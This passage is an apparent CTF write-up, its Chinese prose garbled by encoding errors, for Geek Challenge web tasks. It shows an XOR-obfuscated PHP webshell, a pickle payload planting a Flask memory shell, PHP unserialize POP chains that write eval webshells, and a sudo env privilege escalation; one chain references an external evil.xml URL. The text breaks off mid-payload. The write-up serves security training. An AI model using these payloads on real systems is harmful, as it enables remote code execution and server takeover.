src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-214339789.png" class="">  <img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-214432734.png" class="">  <img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-223055029.png" class="">  <p>è´¦å·å¯†ç ä¸ºadmin/SYC@chengxing<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-223206303.png" class=""><br>åå°å‘ç°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ <br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-223408562.png" class=""><br>å…¶å­˜åœ¨wafï¼Œæˆ‘è¿™é‡Œç›´æ¥ä½¿ç”¨æ— å­—æ¯æ•°å­—webshellæ¥ç»•è¿‡<a href="https://lisien11.xyz/2024/03/18/NSSCTF%E5%88%B7%E9%A2%981(%E5%86%85%E6%9C%89%E6%97%A0%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97RCE">æ— å­—æ¯æ•°å­—webshell</a>/?highlight=%E6%97%A0%E5%AD%97%E6%AF%8D)<br>å¼‚æˆ–ç»•è¿‡<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="meta">&lt;?php</span> %<span class="number">24</span>_%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>!((%<span class="number">25</span>)(%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">40</span>%<span class="number">5</span>B%<span class="number">5</span>B%<span class="number">40</span>%<span class="number">5</span>B%<span class="number">5</span>C%<span class="number">5</span>C%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>!%<span class="number">2</span>B%<span class="number">2</span>F((%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>~%<span class="number">7</span>B%<span class="number">60</span>%<span class="number">7</span>B%<span class="number">7</span>C%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>_(%<span class="number">24</span>___%<span class="number">5</span>B_%<span class="number">5</span>D)%<span class="number">3</span>B <span class="meta">?&gt;</span>&amp;save=%E4%BF%<span class="number">9</span>D%E5%AD%<span class="number">98</span></span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-224459826.png" class="">  </p><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-224447694.png" class="">  <h2 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h2><p>äº§ç”Ÿäº†å¾ˆå¤šä¸Šä¼ æ–¹æ³•å‘ç°éƒ½ä¸è¡Œ,çŒœæµ‹æœ‰å¯èƒ½æ˜¯ä¸­é—´ä»¶çš„è§£ææ¼æ´<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-230234912.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-230216773.png" class=""><br>å…¶å­˜åœ¨æ¢è¡Œç¬¦è§£ææ¼æ´<br><a href="https://www.cnblogs.com/leixiao-/p/10223090.html">Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰</a><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-231025631.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-231050095.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-231140261.png" class="">  </p><h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h2><p>æ³¨å†Œç™»é™†åå¯ä»¥å¾—åˆ°æºç </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, make_response, render_template, send_file</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> black</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#To Ctferï¼šç»™ä½ æºç åªæ˜¯ç»™ä½ æ¼æ´ç‚¹çš„hintï¼Œæ€ä¹ˆç»•ï¼Ÿblack.pyé»‘ç›’ï¼Œå”‰æ— æ„ä¹‰</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">open</span>(<span class="string">&#x27;templates/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        usname = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        passwd = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> usname <span class="keyword">and</span> passwd:</span><br><span class="line">            heart_cookie = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">            response = make_response(<span class="string">f&quot;Registered successfully with username: <span class="subst">&#123;usname&#125;</span> &lt;br&gt; Now you can go to /login to heal starven&#x27;s heart&quot;</span>)</span><br><span class="line">            response.set_cookie(<span class="string">&#x27;heart&#x27;</span>, heart_cookie)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>  render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    heart_cookie = request.cookies.get(<span class="string">&#x27;heart&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> heart_cookie:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;warning.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.cookies.get(<span class="string">&#x27;heart&#x27;</span>) == heart_cookie:</span><br><span class="line">        statement = request.form[<span class="string">&#x27;statement&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            heal_state = base64.b64decode(statement)</span><br><span class="line">            <span class="built_in">print</span>(heal_state)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> black.blacklist:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> heal_state:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;waf.html&#x27;</span>)</span><br><span class="line">            pickle.loads(heal_state)</span><br><span class="line">            res = make_response(<span class="string">f&quot;Congratulations! You accomplished the first step of healing Starven&#x27;s broken heart!&quot;</span>)</span><br><span class="line">            flag = os.getenv(<span class="string">&quot;GEEK_FLAG&quot;</span>) <span class="keyword">or</span> os.system(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">            os.system(<span class="string">&quot;echo &quot;</span> + flag + <span class="string">&quot; &gt; /flag&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>( e)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error!!!! give you hint: maybe you can view /starven_s3cret&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/monologue&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">joker</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;joker.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/starven_s3cret&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__,as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°åªè¦ç™»é™†åå°±å¯ä»¥pickleååºåˆ—åŒ–ï¼Œå¥½åƒå¾—ç»•wafï¼Œä¸ç®¡ä»–å…ˆè¯•ä¸€ä¸‹å†…å­˜é©¬<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;lse&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-225435984.png" class=""><br>è¿‡äº†?<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-225524912.png" class="">  </p><p>è–›å®šè°”çš„waf<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241111-100027773.png" class="">  </p><h2 id="not-just-pop"><a href="#not-just-pop" class="headerlink" title="not_just_pop"></a>not_just_pop</h2><p>é¦–å…ˆæ˜¯phpååºåˆ—ï¼Œä¸»è¦è€ƒç‚¹å°±æ˜¯GCå›æ”¶æœºåˆ¶ï¼Œåˆ©ç”¨æ•°ç»„çš„æ–¹å¼æ¥è§¦å‘ï¼Œ é“¾å­æˆ‘å°±ä¸å¤šè¯´äº†å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lhRaMK7&#123;__destruct&#125;-&gt;Parar&#123;__set&#125;-&gt;Starven&#123;__toString&#125;-&gt;Parar&#123;__get&#125;-&gt;SYC-&gt;&#123;__isset&#125;-&gt;Starven&#123;__call&#125;-&gt;lhRaMK7&#123;invoke&#125;</span><br></pre></td></tr></table></figure><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-010421210.png" class="">  <p>ä»£ç ä¼šæŠ›å‡ºå¼‚å¸¸æ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨GCå›æ”¶æœºåˆ¶æ¥æå‰è§¦å‘ååºåˆ—åŒ–<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lhRaMK7</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Do</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$You</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>=<span class="string">&quot;eval(\$_POST[123]);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parar</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$execurise</span>=<span class="string">&quot;man!&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lead</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hansome</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Starven</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$friend</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYC</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$forever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;forever-&gt;<span class="title function_ invoke__">nononon</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;You=<span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;You-&gt;lead=<span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;You-&gt;lead-&gt;girl=<span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;You-&gt;lead-&gt;girl-&gt;hansome=<span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever=<span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever-&gt;friend=<span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&quot;0&quot;</span>=&gt;<span class="variable">$a</span>,<span class="string">&quot;1&quot;</span>=&gt;<span class="literal">null</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><br>å°†è¾“å‡ºçš„å€¼ä¸­çš„åé¢çš„1æ”¹ä¸º0ï¼Œå†urlè§£ç ã€‚ç„¶åå†base64ç¼–ç <br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-010843675.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-011013718.png" class=""><br>å­˜åœ¨disable_functionsç”¨èšå‰‘æ¥ç»•<br>ç›´æ¥èšå‰‘è¿<br>ä½¿ç”¨PHP7 Backtrace UAFæˆåŠŸç»•è¿‡<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241110-215002369.png" class=""><br>ç„¶åå°±æ˜¯sudoææƒäº†<br>sudo -l<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-011450076.png" class=""><br>ä¼šå‘ç°æœ‰envã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨envæ¥sudoææƒ<br>sudo env /bin/bash -c â€œcat /flagâ€<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241110-221405582.png" class="">  </p><h2 id="phpä¸æ¯”javaå·®"><a href="#phpä¸æ¯”javaå·®" class="headerlink" title="phpä¸æ¯”javaå·®"></a>phpä¸æ¯”javaå·®</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-193533066.png" class="">  <p>æˆ‘ä»¬çœ‹ä¸€ä¸‹ä¼šæ‰¾åˆ°ä¸€ä¸ªå…¥å£ç‚¹æ–¹æ³•<code>__unserialize</code>ï¼Œè¿™ä¸ªé­”æœ¯æ–¹æ³•æ˜¯8.1ç‰ˆæœ¬å‡ºçš„,èµ·åœ¨ååºåˆ—æ—¶è§¦å‘ï¼Œä¸”å¦‚æœäºwakeupåŒæ—¶å­˜åœ¨æ—¶ï¼Œåªè§¦å‘<code>__unserialize</code>èµ·å‚æ•°$dataå…¶å®å°±æ˜¯å­˜å‚¨äº†è¯¥ç±»æ‰€æœ‰å±æ€§çš„æ•°ç»„<br>è€Œæœ€ç»ˆçš„å‘½ä»¤æ‰§è¡Œç‚¹å…¶å®å°±æ˜¯ä¸‹é¢çš„åå°„è°ƒç”¨æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">ä»»æ„ä»£ç æ‰§è¡Œä¸‹çš„phpåŸç”Ÿç±»åˆ©ç”¨</a></p><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-160339097.png" class="">  <img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-193326963.png" class="">  <p>å³æˆ‘ä»¬åªè¦å°†ISèµ‹å€¼ä¸ºsystem,whereèµ‹å€¼ä¸ºReflectionFunctionã€‚Starvenèµ‹å€¼ä¸ºinvokeã€‚æœ€åå°±å¯ä»¥å‘½ä»¤æ‰§è¡ŒGirlfriendçš„å†…å®¹äº†</p><p>é“¾å­å¾ˆçŸ­æˆ‘ä»¬åªè¦å°†changeèµ‹å€¼ä¸ºimplodeï¼ŒGeekå…¶ä¸­ä¸€ä¸ªå±æ€§èµ‹å€¼ä¸ºSycloverã€‚è¿™æ ·å°±ä¼šå¯¼è‡´$dataå†…çš„Sycloveräºå¦ä¸€ä¸ªå±æ€§æ‹¼æ¥ä»è€Œè§¦å‘toStringã€‚ç„¶ååå°„è°ƒç”¨å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Sink</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Is there any file?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$FLAG</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Geek</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$change</span>=<span class="string">&quot;implode&quot;</span>;</span><br><span class="line">        <span class="variable">$FUNC</span>=<span class="variable">$change</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$FUNC</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Syclover</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Where</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$IS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Starven</span>=<span class="string">&quot;invoke&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Girlfriend</span>=<span class="keyword">array</span>(<span class="string">&quot;http://111.230.38.159:8000/evil.xml&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString is called&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$eee</span>=<span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Where</span>(<span class="variable">$this</span>-&gt;IS);</span><br><span class="line">        <span class="variable">$fff</span>=<span class="variable language_">$this</span>-&gt;Starven;</span><br><span class="line">        <span class="variable">$eee</span>-&gt;<span class="variable">$fff</span>(<span class="variable language_">$this</span>-&gt;Girlfriend);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;111&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="keyword">new</span> <span class="title class_">Syclover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;Where=<span class="string">&quot;ReflectionFunction&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;IS=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;Girlfriend=<span class="string">&quot;echo &#x27;&lt;?php eval(\$_POST[123]);phpinfo();?&gt;&#x27; &gt; /var/www/html/shell.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="comment">#unserialize($b);</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Geek&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;Syclover&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Where&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;ReflectionFunction&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;IS&quot;</span>;s:<span class="number">6</span>:<span 